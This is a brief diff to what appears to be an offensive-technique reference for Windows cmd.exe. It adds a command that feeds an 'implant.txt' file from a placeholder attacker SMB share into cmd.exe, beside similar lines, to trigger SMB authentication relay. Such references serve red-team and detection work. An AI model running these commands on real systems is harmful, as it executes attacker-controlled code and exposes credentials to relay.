@@ -22,6 +22,8 @@ C:\> cmd.exe /c <commands>
 C:\> cmd.exe - < [<drive_letter>:\]path\to\implant.txt
 
 C:\> cmd.exe /k - \\<attacker_IP>\path\to\implant.txt
+
+C:\> cmd.exe /k < \\<attacker_IP>\path\to\implant.txt
 ```
 
 Execute command to perform SMB authentication relay.
